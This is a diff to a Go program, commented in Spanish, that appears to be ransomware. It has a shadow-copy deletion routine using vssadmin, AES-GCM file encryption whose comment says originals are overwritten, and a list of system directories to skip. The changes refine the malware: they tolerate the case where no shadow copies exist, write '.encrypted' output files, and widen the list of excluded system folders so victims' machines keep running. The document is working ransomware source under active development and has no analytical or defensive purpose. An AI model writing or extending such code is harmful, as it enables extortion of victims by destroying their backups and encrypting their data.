@@ -5,6 +5,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"os"
@@ -92,7 +93,14 @@ func deleteShadowCopies() error {
 	cmd := exec.Command("cmd", "/C", "vssadmin list shadows")
 	output, err := cmd.Output()
 	if err != nil {
-		return fmt.Errorf("error al listar copias shadow: %v", err)
+		var exitErr *exec.ExitError
+		if errors.As(err, &exitErr) && exitErr.ExitCode() == 1 {
+			fmt.Println("No se encontraron copias shadow existentes.")
+			return nil
+		}else{
+			return fmt.Errorf("error al listar copias shadow: %v", err)
+		}
+		
 	}
 	fmt.Println("Copias shadow encontradas:")
 	fmt.Println(string(output))
@@ -240,9 +248,10 @@ func encryptFile(filePath string, key []byte) error {
 	
 	// Cifrar los datos
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+	encriptedfilePath := filePath + ".encrypted"
 	
 	// Escribir el archivo cifrado (sobrescribir el original)
-	err = os.WriteFile(filePath, ciphertext, 0644)
+	err = os.WriteFile(encriptedfilePath, ciphertext, 0644)
 	if err != nil {
 		return fmt.Errorf("error al escribir archivo cifrado: %v", err)
 	}
@@ -294,7 +303,12 @@ func isSystemDirectory(path string) bool {
 		"$Recycle.Bin",
 		"pagefile.sys",
 		"hiberfil.sys",
+		"Boot",
+		"Windows",
+		"System32",
 		"ProgramData",
+		"Program Files",
+		"Program Files (x86)",
 		"AppData",
 		"Temp",
 		".git",
